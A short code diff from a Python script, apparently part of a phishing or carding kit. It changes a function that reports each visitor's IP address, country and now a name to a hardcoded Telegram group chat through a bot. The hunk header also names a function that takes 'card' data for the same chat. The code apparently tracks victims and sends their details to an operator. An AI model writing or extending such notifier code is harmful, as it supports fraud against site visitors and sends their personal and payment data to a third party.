@@ -65,13 +65,13 @@ def ne_pizdabol(card, chat_id='-4150791967'):
     except TelegramError as e:
         print(f"Failed to send message: {e}")
 
-def cheltut(ip: str):
+def cheltut(ip,name):
     try:
         chat_id='-4150791967'
         if ip.find('176.101.2.213') != -1:
             pass
         bot = Bot(token=API_TOKEN)
-        message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip} \n🌏: `{get_country_by_ip(ip)}`')
+        message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
         bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
     except TelegramError as e:
         print(f"Failed to send message: {e}")
